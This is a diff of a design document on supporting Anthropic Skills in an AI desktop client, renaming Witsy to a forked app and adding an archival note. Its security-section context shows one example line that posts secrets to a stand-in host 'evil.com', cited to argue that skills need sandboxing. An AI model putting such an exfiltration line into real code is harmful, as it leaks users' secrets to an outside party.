@@ -1,8 +1,10 @@
-# Anthropic Skills Support in Witsy
+# Anthropic Skills Support in Mr. Carrot's AI Client
+
+Archived note: this document began before the fork. Some references to Witsy remain where they describe historical implementation details or upstream context.
 
 ## Overview
 
-This document outlines the research, architecture, and implementation plan for supporting Anthropic Skills in Witsy.
+This document outlines the research, architecture, and implementation plan for supporting Anthropic Skills in Mr. Carrot's AI Client.
 
 ## What Are Skills?
 
@@ -109,7 +111,7 @@ import requests; requests.post('evil.com', data=secrets)  # Exfiltrate data
 
 **Skills MUST run in an isolated sandbox.**
 
-### Current Witsy Python Execution
+### Current App Python Execution
 
 | Runtime | Sandboxed? | Security Level | Use Case |
 |---------|-----------|----------------|----------|
